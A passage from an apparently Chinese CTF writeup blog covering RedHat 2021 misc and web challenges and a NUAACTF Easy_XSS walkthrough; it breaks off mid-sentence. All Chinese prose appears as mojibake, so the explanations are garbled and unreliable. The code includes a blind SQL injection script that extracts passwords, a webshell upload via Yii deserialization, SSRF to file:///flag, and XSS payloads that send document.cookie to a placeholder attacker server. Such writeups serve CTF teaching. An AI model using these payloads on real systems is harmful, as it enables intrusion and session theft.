alt="mix1"></p><p><img src="/2021/05/24/CTF_2021RedHat/mix2.png" alt="mix2"></p><p>ç¬¬äºŒå¼ æ˜æ˜¾æœ‰ä¸ªäºŒç»´ç ï¼Œè„šæœ¬æ•´ä¸€ä¸ªï¼</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""MiaoTony"""</span><span class="token keyword">import</span> os<span class="token keyword">import</span> cv2<span class="token keyword">import</span> struct<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">from</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">import</span> plot<span class="token punctuation">,</span> show<span class="token keyword">def</span> <span class="token function">fft</span><span class="token punctuation">(</span>img<span class="token punctuation">)</span><span class="token punctuation">:</span>    fft <span class="token operator">=</span> np<span class="token punctuation">.</span>fft<span class="token punctuation">.</span>fft2<span class="token punctuation">(</span>img<span class="token punctuation">)</span>    fft <span class="token operator">=</span> np<span class="token punctuation">.</span>fft<span class="token punctuation">.</span>fftshift<span class="token punctuation">(</span>fft<span class="token punctuation">)</span>    m <span class="token operator">=</span> np<span class="token punctuation">.</span>log<span class="token punctuation">(</span>np<span class="token punctuation">.</span><span class="token builtin">abs</span><span class="token punctuation">(</span>fft<span class="token punctuation">)</span><span class="token punctuation">)</span>    p <span class="token operator">=</span> np<span class="token punctuation">.</span>angle<span class="token punctuation">(</span>fft<span class="token punctuation">)</span>    <span class="token keyword">return</span> m<span class="token punctuation">,</span> p<span class="token keyword">def</span> <span class="token function">ifft</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">:</span>    x <span class="token operator">=</span> np<span class="token punctuation">.</span>exp<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token operator">*</span>np<span class="token punctuation">.</span>exp<span class="token punctuation">(</span><span class="token number">1j</span><span class="token operator">*</span>p<span class="token punctuation">)</span>    y <span class="token operator">=</span> np<span class="token punctuation">.</span>fft<span class="token punctuation">.</span>ifftshift<span class="token punctuation">(</span>x<span class="token punctuation">)</span>    img <span class="token operator">=</span> np<span class="token punctuation">.</span>real<span class="token punctuation">(</span>np<span class="token punctuation">.</span>fft<span class="token punctuation">.</span>ifft2<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span>    img <span class="token operator">=</span> img<span class="token punctuation">.</span>astype<span class="token punctuation">(</span>np<span class="token punctuation">.</span>uint8<span class="token punctuation">)</span>    <span class="token comment"># print(img)</span>    <span class="token keyword">return</span> img<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    img1 <span class="token operator">=</span> cv2<span class="token punctuation">.</span>imread<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'mix1.png'</span></span><span class="token punctuation">,</span> cv2<span class="token punctuation">.</span>IMREAD_GRAYSCALE<span class="token punctuation">)</span>    img2 <span class="token operator">=</span> cv2<span class="token punctuation">.</span>imread<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'mix2.png'</span></span><span class="token punctuation">,</span> cv2<span class="token punctuation">.</span>IMREAD_GRAYSCALE<span class="token punctuation">)</span>    m1<span class="token punctuation">,</span> p1 <span class="token operator">=</span> fft<span class="token punctuation">(</span>img1<span class="token punctuation">)</span>    m2<span class="token punctuation">,</span> p2 <span class="token operator">=</span> fft<span class="token punctuation">(</span>img2<span class="token punctuation">)</span>    new_img1 <span class="token operator">=</span> ifft<span class="token punctuation">(</span>m1<span class="token punctuation">,</span> p2<span class="token punctuation">)</span>    new_img2 <span class="token operator">=</span> ifft<span class="token punctuation">(</span>m2<span class="token punctuation">,</span> p1<span class="token punctuation">)</span>    cv2<span class="token punctuation">.</span>imwrite<span class="token punctuation">(</span><span class="token string">'new1.png'</span><span class="token punctuation">,</span> new_img1<span class="token punctuation">)</span>    cv2<span class="token punctuation">.</span>imwrite<span class="token punctuation">(</span><span class="token string">'new2.png'</span><span class="token punctuation">,</span> new_img2<span class="token punctuation">)</span></code></pre><p>å…¶ä¸­ä¸€å¼ é‡Œé¢å°±çœ‹å‡ºäºŒç»´ç äº†ã€‚</p><p><img src="/2021/05/24/CTF_2021RedHat/new1.png" alt="new1"></p><p>å†ç¨å¾®è°ƒä¸€ä¸‹å›¾åƒçš„æ›²çº¿ã€‚</p><p><img src="/2021/05/24/CTF_2021RedHat/new1-1.png"></p><p>æ‰«ç å¾—åˆ°</p><pre class="language-none"><code class="language-none">0f88b8529ab6c0dd2b5ceefaa1c5151aa207da114831b371ddcafc74cf8701c1d3318468d50e4b1725179d1bc04b251f</code></pre><blockquote><p>å””ï¼ŒIFFT é‚£æ­¥åº”è¯¥å–æ¨¡å€¼è€Œä¸æ˜¯ç›´æ¥å–å®éƒ¨ï¼Œä¹Ÿå°±æ˜¯æ”¹æˆ</p><pre class="language-python" data-language="python"><code class="language-python">img <span class="token operator">=</span> np<span class="token punctuation">.</span><span class="token builtin">abs</span><span class="token punctuation">(</span>np<span class="token punctuation">.</span>fft<span class="token punctuation">.</span>ifft2<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>è¿™æ ·å¾—åˆ°çš„å›¾ç‰‡å°±ä¸ä¼šä¸¢å¤±è™šéƒ¨çš„ä¿¡æ¯äº†ã€‚</p><p><img src="/2021/05/24/CTF_2021RedHat/new11.png"></p></blockquote><h4 id="final-challenge"><a href="#final-challenge" class="headerlink" title="final challenge"></a>final challenge</h4><p><img src="/2021/05/24/CTF_2021RedHat/phase.png" alt="phase"></p><p>æ ¹æ®æ–‡ä»¶åç§°ï¼Œç›²çŒœæ˜¯ç›¸ä½ä¸Šæœ‰çŒ«è…»ã€‚</p><p>é¦–å…ˆå°†å¹…å€¼è°ƒæ•´åˆ° -pi åˆ° pi ä¹‹é—´ï¼Œå½“ä½œç›¸ä½ï¼Œä½œå‚…é‡Œå¶åå˜æ¢ï¼Œæœ€åå†å½’ä¸€åŒ–åˆ° 0 åˆ° 255 ä¹‹é—´ï¼Œç”»å‡ºå›¾åƒã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> cv2<span class="token keyword">import</span> struct<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">from</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">import</span> plot<span class="token punctuation">,</span> show<span class="token keyword">def</span> <span class="token function">mapping</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> down<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> up<span class="token operator">=</span><span class="token number">255</span><span class="token punctuation">,</span> tp<span class="token operator">=</span>np<span class="token punctuation">.</span>uint8<span class="token punctuation">)</span><span class="token punctuation">:</span>    data_max <span class="token operator">=</span> data<span class="token punctuation">.</span><span class="token builtin">max</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    data_min <span class="token operator">=</span> data<span class="token punctuation">.</span><span class="token builtin">min</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    interval <span class="token operator">=</span> data_max <span class="token operator">-</span> data_min    new_interval <span class="token operator">=</span> up <span class="token operator">-</span> down    new_data <span class="token operator">=</span> <span class="token punctuation">(</span>data <span class="token operator">-</span> data_min<span class="token punctuation">)</span> <span class="token operator">*</span> new_interval <span class="token operator">/</span> interval <span class="token operator">+</span> down    new_data <span class="token operator">=</span> new_data<span class="token punctuation">.</span>astype<span class="token punctuation">(</span>tp<span class="token punctuation">)</span>    <span class="token keyword">return</span> new_data<span class="token keyword">def</span> <span class="token function">fft</span><span class="token punctuation">(</span>img<span class="token punctuation">)</span><span class="token punctuation">:</span>    fft <span class="token operator">=</span> np<span class="token punctuation">.</span>fft<span class="token punctuation">.</span>fft2<span class="token punctuation">(</span>img<span class="token punctuation">)</span>    fft <span class="token operator">=</span> np<span class="token punctuation">.</span>fft<span class="token punctuation">.</span>fftshift<span class="token punctuation">(</span>fft<span class="token punctuation">)</span>    m <span class="token operator">=</span> np<span class="token punctuation">.</span>log<span class="token punctuation">(</span>np<span class="token punctuation">.</span><span class="token builtin">abs</span><span class="token punctuation">(</span>fft<span class="token punctuation">)</span><span class="token punctuation">)</span>    p <span class="token operator">=</span> np<span class="token punctuation">.</span>angle<span class="token punctuation">(</span>fft<span class="token punctuation">)</span>    <span class="token keyword">return</span> m<span class="token punctuation">,</span> p<span class="token keyword">def</span> <span class="token function">ifft</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">:</span>    x <span class="token operator">=</span> np<span class="token punctuation">.</span>exp<span class="token punctuation">(</span><span class="token number">1j</span><span class="token operator">*</span>p<span class="token punctuation">)</span>    y <span class="token operator">=</span> np<span class="token punctuation">.</span>fft<span class="token punctuation">.</span>ifftshift<span class="token punctuation">(</span>x<span class="token punctuation">)</span>    img <span class="token operator">=</span> np<span class="token punctuation">.</span><span class="token builtin">abs</span><span class="token punctuation">(</span>np<span class="token punctuation">.</span>fft<span class="token punctuation">.</span>ifft2<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> img<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    img <span class="token operator">=</span> cv2<span class="token punctuation">.</span>imread<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'phase.png'</span></span><span class="token punctuation">,</span> cv2<span class="token punctuation">.</span>IMREAD_GRAYSCALE<span class="token punctuation">)</span>    <span class="token comment"># print(img.max(), img.min())</span>    p <span class="token operator">=</span> mapping<span class="token punctuation">(</span>img<span class="token punctuation">,</span> <span class="token operator">-</span>np<span class="token punctuation">.</span>pi<span class="token punctuation">,</span> np<span class="token punctuation">.</span>pi<span class="token punctuation">,</span> tp<span class="token operator">=</span>np<span class="token punctuation">.</span>float64<span class="token punctuation">)</span>    img_raw <span class="token operator">=</span> ifft<span class="token punctuation">(</span>p<span class="token punctuation">)</span>    img2 <span class="token operator">=</span> mapping<span class="token punctuation">(</span>img_raw<span class="token punctuation">)</span>    cv2<span class="token punctuation">.</span>imwrite<span class="token punctuation">(</span><span class="token string">'final.png'</span><span class="token punctuation">,</span> img2<span class="token punctuation">)</span></code></pre><p><img src="/2021/05/24/CTF_2021RedHat/final.png" alt="final"></p><p>å¾—åˆ° <code>AESKEY: a8bms0v4qer3wgd67ofjhyxku5pi1czl</code></p><p>è€Œåç”¨ AES ECB æ¨¡å¼è§£å¯†</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AESkey <span class="token operator">=</span> <span class="token string">"a8bms0v4qer3wgd67ofjhyxku5pi1czl"</span>aes <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_ECB<span class="token punctuation">)</span>cipher <span class="token operator">=</span> binascii<span class="token punctuation">.</span>unhexlify<span class="token punctuation">(</span>    <span class="token string">"0f88b8529ab6c0dd2b5ceefaa1c5151aa207da114831b371ddcafc74cf8701c1d3318468d50e4b1725179d1bc04b251f"</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> aes<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># b'flag{1ba48c8b-4eca-46aa-8216-d164538af310}\x06\x06\x06\x06\x06\x06'</span></code></pre><p><code>flag{1ba48c8b-4eca-46aa-8216-d164538af310}</code></p><blockquote><p>è‰ï¼Œæœç„¶æ˜¯ CV å¸¦å¸ˆï¼ŒæŠŠå‚…é‡Œå¶å˜æ¢å„ç§æŠ˜è…¾ï¼Œå–µå–µæ˜¯ fwï¼Œå’±è‡ªå·±çˆ¬ï¼ˆï¼ˆ</p></blockquote><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="find-it"><a href="#find-it" class="headerlink" title="find_it"></a>find_it</h3><p><code>robots.txt</code> æ³„éœ²ï¼Œè®¿é—® <code>1ndexx.php</code> æŠ¥500ï¼Œåæ‰“å¼€ <code>.1ndexx.php.swp</code> æ‹¿åˆ°æºç ï¼Œphpinfo é¡µé¢æ‹¿åˆ° flag</p><pre class="language-none"><code class="language-none">code=&lt;?php phpinfo();?&gt;</code></pre><h3 id="framework"><a href="#framework" class="headerlink" title="framework"></a>framework</h3><p><code>www.zip</code> æ‹¿åˆ°æºç </p><p>yii ååºåˆ—åŒ–æ¼æ´ RCE CVE-2020-15148</p><p><a href="https://ca01h.top/code_audit/PHP/8.Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E6%8B%93%E5%B1%95/#%E7%BC%96%E5%86%99EXP">https://ca01h.top/code_audit/PHP/8.Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E6%8B%93%E5%B1%95/#%E7%BC%96%E5%86%99EXP</a></p><p>é­”æ”¹ exp <code>file_put_contents</code> ä¸Šä¼ é©¬ï¼Œç„¶åèšå‰‘è¿ä¸Šåç»•è¿‡ disable_functionï¼Œæ‹¿åˆ° flag</p><h3 id="WebsiteManger"><a href="#WebsiteManger" class="headerlink" title="WebsiteManger"></a>WebsiteManger</h3><p><code>image.php?id=</code> å­˜åœ¨æ³¨å…¥</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestspasswd <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        url <span class="token operator">=</span> <span class="token string">'http://eci-2zeir5o8p6vh97bek411.cloudeci1.ichunqiu.com/image.php?id=if(ascii(substr((select/**/group_concat(password)/**/from/**/users),{},1))={},1,0)'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>            i<span class="token punctuation">,</span> j<span class="token punctuation">)</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>            passwd <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span>            <span class="token keyword">continue</span><span class="token comment"># e845b14ae11ff886a2f72</span></code></pre><p><code>admin</code> / <code>e845b14ae11ff886a2f72</code> ç™»å½•</p><p>è€Œå SSRF <code>file:///flag</code> æ‹¿åˆ° flag</p><p><img src="/2021/05/24/CTF_2021RedHat/upload_7eec12741899fd163833b3f3d7db7fad.png"></p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>å–µå–µå¥½èœå•Šï¼Œå–µå‘œå‘œã€‚</p><p>å†™è®ºæ–‡å¥½çƒ¦å•Šï¼Œå¤ªéš¾å—å•¦ï¼</p><p>è¿˜æ˜¯æ‘¸é±¼èˆ’æœã€‚</p><p>ï¼ˆæºœäº†æºœäº†</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | 2021 NUAACTF Easy_XSS å¤ç°</title>
      <link href="2021/05/17/CTF_2021NUAACTF_EasyXSS/"/>
      <url>2021/05/17/CTF_2021NUAACTF_EasyXSS/</url>
      
        <content type="html"><![CDATA[<blockquote><p>æœ¬æ–‡é¦–å‘äºå…ˆçŸ¥ç¤¾åŒºï¼š<a href="https://xz.aliyun.com/t/9516">https://xz.aliyun.com/t/9516</a></p></blockquote><h2 id="å¼•è¨€"><a href="#å¼•è¨€" class="headerlink" title="å¼•è¨€"></a>å¼•è¨€</h2><p>åœ¨ NUAACTF 2021 ä¸­ï¼Œæœ‰ä¸€é“ XSS ç›¸å…³çš„é¢˜ç›® Easy_XSSï¼Œæ¯”èµ›çš„æ—¶å€™å°±åªæœ‰ä¸€é˜Ÿåšå‡ºæ¥äº†ã€‚</p><p><em>ï¼ˆå½“ç„¶åªæ˜¯æ ¡å†…ç©ç©è€Œå·²ï¼Œå¤§å¸ˆå‚…ä»¬åº”è¯¥éšä¾¿å°± AK äº† Orz</em></p><p>é¢˜ç›®è€ƒç‚¹ä¸»è¦æ¶‰åŠ XSS ç»•è¿‡ã€PHP ä»£ç å®¡è®¡ã€æ–‡ä»¶ä¸Šä¼ ç»•è¿‡ç­‰ï¼Œéš¾åº¦å…¶å®è¿˜å¥½ã€‚</p><p>æœ€è¿‘å‡ å¤©æ‘¸é±¼ï¼Œå°±æ¥å¤ç°ä¸€ä¸‹å§ã€‚</p><p>é¡ºä¾¿è¿˜æ‹“å±•å­¦ä¹ äº†ä¸€ä¸‹ <code>iframe</code> æ ‡ç­¾ä¸­çš„ <code>srcdoc</code> å±æ€§åœ¨ XSS ä¸­çš„åˆ©ç”¨ã€‚</p><h2 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h2><blockquote><p><strong>Easy XSS</strong></p><p>å°è¯•å»è·å–ç®¡ç†å‘˜çš„ç¥ç§˜é¡µé¢ upload.php å§ï¼</p><p><a href="http://45.76.221.54:8005/">http://45.76.221.54:8005</a> </p></blockquote><h2 id="è§£é¢˜æ­¥éª¤"><a href="#è§£é¢˜æ­¥éª¤" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h2><h3 id="Step-01-æ”¶é›†ç¯å¢ƒä¿¡æ¯"><a href="#Step-01-æ”¶é›†ç¯å¢ƒä¿¡æ¯" class="headerlink" title="Step 01 æ”¶é›†ç¯å¢ƒä¿¡æ¯"></a>Step 01 æ”¶é›†ç¯å¢ƒä¿¡æ¯</h3><p>æ‰“å¼€é¢˜ç›®å‘ç°æ˜¯ä¸ª Blogï¼Œå¯ä»¥åœ¨é‡Œé¢å‘ postã€‚</p><p><img src="/2021/05/17/CTF_2021NUAACTF_EasyXSS/image-20210414235709932.png"></p><p>å‘ post éœ€è¦ç™»å½•ï¼Œé‚£å°±å…ˆéšæ„æ³¨å†Œä¸ªè´¦æˆ·ã€‚</p><p><img src="/2021/05/17/CTF_2021NUAACTF_EasyXSS/image-20210414235805627.png"></p><p>æ ¹æ®é¢˜ç›®æè¿°ï¼Œç›´æ¥è®¿é—® <code>upload.php</code>ï¼Œä¼šæç¤ºéœ€è¦ admin æ‰èƒ½ä¸Šä¼ ã€‚</p><p><img src="/2021/05/17/CTF_2021NUAACTF_EasyXSS/image-20210414235909724.png"></p><p><del>å•Šï¼Œå±…ç„¶æ²¡æœ‰å‰ç«¯ç•Œé¢ï¼Œåªæœ‰ä¸‘ä¸‘çš„æºä»£ç </del></p><p>å¯æ˜¯æœ‰æºä»£ç å¼å•Šï¼</p><p>é‚£å°±çœ‹çœ‹æ€ä¹ˆè·å– admin æƒé™å¥½äº†ã€‚</p><h3 id="Step-02-XSS-åŠå…¶ç»•è¿‡"><a href="#Step-02-XSS-åŠå…¶ç»•è¿‡" class="headerlink" title="Step 02 XSS åŠå…¶ç»•è¿‡"></a>Step 02 XSS åŠå…¶ç»•è¿‡</h3><p>æ—¢ç„¶æ˜¯ XSS å˜›ï¼Œé‚£å°±æƒ³åˆ°å…ˆè¯•è¯• <code>img</code> æ ‡ç­¾å¥½äº†ã€‚</p><p>å…ˆæ„é€ ä¸€ä¸ªæœ€æ™®é€šçš„ï¼Œåˆ©ç”¨ url æ¥ä¼ é€’ cookieã€‚</p><p>è‡ªå·±çš„ VPS ä¸Šèµ·ä¸ª web æœåŠ¡æ¥æ¥æ”¶ä¸€ä¸‹ï¼Œæˆ–è€…å¦‚æœæœ‰ NGINX çš„è¯çœ‹çœ‹ log ä¹Ÿè¡Œã€‚</p><p>payload:</p><pre class="language-none"><code class="language-none">meow&lt;img src='#' onerror="window.location.href='//VPSIP:PORT/'+document.cookie"&gt;233 </code></pre><p>ç„¶è€Œå‘ç° <code>img</code> <code>window</code> <code>document</code> <code>on</code> è¢«æ›¿æ¢ä¸ºç©ºäº†ï¼Œ<code>location</code> -&gt; <code>locati</code>ã€‚</p><p><img src="/2021/05/17/CTF_2021NUAACTF_EasyXSS/image-20210414233927808.png"></p><p>é‚£å°±è¯•è¯•åŒå†™ç»•è¿‡è¡Œä¸è¡Œã€‚</p><pre class="language-none"><code class="language-none">meow&lt;imimgg src='#' oonnerror="windwindowow.locatioonn.href='//VPSIP:PORT/'+documdocumentent.cookie"&gt;23333</code></pre><p>å¾ˆå¥½ï¼ŒæˆåŠŸæ„é€ å‡ºäº†é¢„æœŸçš„ xss è¯­å¥ï¼Œå®ç°äº†è·³è½¬ã€‚</p><p><img src="/2021/05/17/CTF_2021NUAACTF_EasyXSS/image-20210414234919521.png"></p><p>æ¥ä¸‹æ¥å°±å‹¾ä¸Š Publish this postï¼Œè®© admin çœ‹ä¸€çœ‹ï¼Œé¡ºä¾¿å·èµ°ä»–çš„ cookieã€‚</p><p><img src="/2021/05/17/CTF_2021NUAACTF_EasyXSS/image-20210414235403622.png"></p><p>æˆåŠŸåœ¨ VPS ä¸Šæ¥æ”¶åˆ° cookieã€‚</p><p><img src="/2021/05/17/CTF_2021NUAACTF_EasyXSS/image-20210414235528864.png"></p><pre class="language-none"><code class="language-none">PHPSESSID=9f767556e4ef66825cb9e3b399e5d243</code></pre><p>è€Œåä¿®æ”¹ cookieï¼Œåˆ·æ–°é¡µé¢å°±æ˜¯ admin äº†ã€‚</p><p><img src="/2021/05/17/CTF_2021NUAACTF_EasyXSS/image-20210415181850853.png"></p><h3 id="Step-03-PHP-æ–‡ä»¶ä¸Šä¼ ç»•è¿‡"><a href="#Step-03-PHP-æ–‡ä»¶ä¸Šä¼ ç»•è¿‡" class="headerlink" title="Step 03 PHP æ–‡ä»¶ä¸Šä¼ ç»•è¿‡"></a>Step 03 PHP æ–‡ä»¶ä¸Šä¼ ç»•è¿‡</h3><p>å†å›åˆ°å¼€å§‹çš„ <code>/upload.php</code>ï¼Œå‘ç°æ­¤æ—¶é¡µé¢ä¸Šç©ºç©ºå¦‚ä¹Ÿï¼Œç¡®å®æ˜¯ admin äº†ã€‚</p><p>æ²¡æœ‰å‰ç«¯ä¸Šä¼ ç•Œé¢ï¼Œé‚£ä¸‹é¢å°±ç›´æ¥å®¡è®¡ PHP æºç å†è‡ªå·±æ„é€ ä¸Šä¼ è¯·æ±‚å§ã€‚</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">require_once</span> <span class="token string single-quoted-string">'init.php'</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'is_admin'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You are not admin! You can't access this page."</span><span class="token punctuation">;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$userdir</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"uploads/"</span> <span class="token operator">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$userdir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$userdir</span><span class="token punctuation">,</span> <span class="token number">0777</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"submit"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$tmp_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"upload"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"upload"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$tmp_name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"filename cannot be empty!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"."</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/ph/i"</span><span class="token punctuation">,</span> <span class="token variable">$extension</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"illegal suffix!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$upload_file_path</span> <span class="token operator">=</span> <span class="token variable">$userdir</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"/"</span> <span class="token operator">.</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">,</span> <span class="token variable">$upload_file_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Error!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Your dir "</span> <span class="token operator">.</span> <span class="token variable">$userdir</span> <span class="token operator">.</span> <span class="token string single-quoted-string">' &lt;br&gt;'</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Your file: "</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token variable">$userdir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span></code></pre><p>å‚è€ƒ <a href="https://www.php.net/manual/zh/features.file-upload.post-method.php#features.file-upload.post-method">PHP æ‰‹å†Œï¼šPOST æ–¹æ³•ä¸Šä¼ </a></p><p><img src="/2021/05/17/CTF_2021NUAACTF_EasyXSS/image-20210415014219262.png"></p><p><code>strrpos()</code> å‡½æ•°æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­æœ€åä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œä¸”å¯¹å¤§å°å†™æ•æ„Ÿã€‚</p><p>äºæ˜¯ <code>$extension</code> å°±æ˜¯æ 